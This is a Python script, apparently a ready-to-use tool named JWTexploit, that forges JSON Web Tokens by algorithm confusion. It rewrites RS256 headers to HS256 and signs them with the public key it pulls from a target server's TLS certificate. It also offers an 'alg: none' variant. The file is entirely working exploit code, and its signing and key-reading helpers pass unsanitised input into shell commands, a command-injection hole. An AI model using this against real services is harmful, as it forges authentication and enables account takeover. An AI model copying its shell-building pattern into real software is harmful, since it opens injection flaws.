#!/bin/python3
import ssl
from socket import socket
from OpenSSL import crypto, SSL
import base64
import codecs
import binascii
import subprocess
import sys, getopt
import idna
from cryptography.hazmat.backends import default_backend
from cryptography import x509
import sys

def usage():
    print(""" The scripts takes the complete JWT and the domain name as inputs, changes the signing algorithm from RS256 to HS256 and signs it with the public key. The modified JWT is the output
    python3 JWTexploit -h HOSTNAME -j JWT
Example:
python3 JWTexploit -h example.com.com -j eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c""")

def get_certificate(hostname, port):
    hostname_idna = idna.encode(hostname)
    sock = socket()

    sock.connect((hostname, port))
    peername = sock.getpeername()
    ctx = SSL.Context(SSL.SSLv23_METHOD) 
    ctx.check_hostname = False
    ctx.verify_mode = SSL.VERIFY_NONE

    sock_ssl = SSL.Connection(ctx, sock)
    sock_ssl.set_connect_state()
    sock_ssl.set_tlsext_host_name(hostname_idna)
    sock_ssl.do_handshake()
    cert = sock_ssl.get_peer_certificate()

    key = crypto.dump_publickey(crypto.FILETYPE_PEM,cert.get_pubkey())
    sock_ssl.close()
    sock.close()

    key = codecs.encode(key, "hex") # Encoding the public key to hexa ASCII
    return key

def parse_jwt(jwt_arg):
    jwt = jwt_arg.split('.')
    jwt[0] = base64.b64decode(jwt[0]).decode('utf-8') # Decoding the JWT to change it
    jwt[0] = jwt[0].replace('RS256','HS256') # Changing the signing algorithm 
    jwt[0] = base64.b64encode(jwt[0].encode('utf-8')) # Then encoding the JWT back to base64
    jwt = jwt[0]+b'.'+str.encode(jwt[1]) # Reassembling the JWT
    jwt=jwt.decode("utf-8")
    return jwt

def sign(jwt, key):
    cmd = 'echo -n "{}" | openssl dgst -sha256 -mac HMAC -macopt hexkey:{}'.format(jwt, key) # Signing the JWT with the key with openssl using the shell
    decrypted = subprocess.check_output(cmd, shell=True)
    decrypted=decrypted.decode("utf-8")
    decrypted=decrypted[9:-1]
    #print(decrypted)
    decrypted = base64.urlsafe_b64encode(binascii.a2b_hex(decrypted)).replace(b'=',b'')
    return decrypted

def exploit(jwt,key):
    key = key.decode("utf-8")
    decrypted = sign(jwt, key) # Signing the JWT with the public key

    jwt=str.encode(jwt)+b'.'+ decrypted # Assembling the JWT with the signature
    print(jwt.decode("utf-8")) # Final result

def read_key(key):
    cmd = 'cat {} | xxd -p | tr -d "\\n"'.format(key)
    key = subprocess.check_output(cmd, shell=True)
    return key

def none(jwt_arg):
    jwt = jwt_arg.split('.')
    jwt[0] = base64.b64decode(jwt[0]).decode('utf-8') # Decoding the JWT to change it
    jwt[0] = jwt[0].replace('RS256','none') # Changing the signing algorithm 
    jwt[0] = jwt[0].replace('HS256','none') # Changing the signing algorithm 
    jwt[0] = base64.b64encode(jwt[0].encode('utf-8')) # Then encoding the JWT back to base64
    jwt = jwt[0]+b'.'+str.encode(jwt[1]) # Reassembling the JWT
    jwt=jwt.decode("utf-8")
    return jwt

def main(argv):
    port=443
    try:
        opts, args = getopt.getopt(argv,"d:k:j:h:n:",["Domain=","JWT=","help=","key=","none="])
    except getopt.GetoptError:
        usage()
        sys.exit(2)

    for opt, arg in opts:
        if opt == '-h':
            usage()
            sys.exit(2)
        elif opt in ("-d"):
            hostname = arg
            key = get_certificate(hostname, port) # Getting the public key from the server
        elif opt in ("-k"):
            key = read_key(arg) + b'0a'
        elif opt in ("-j"):
            jwt_arg = arg
        elif opt in ("-n"):
            print(none(arg))
            sys.exit(2)
        else:
            usage()
            sys.exit(2)

    jwt = parse_jwt(jwt_arg)
    exploit(jwt, key)

if __name__ == "__main__":
   main(sys.argv[1:])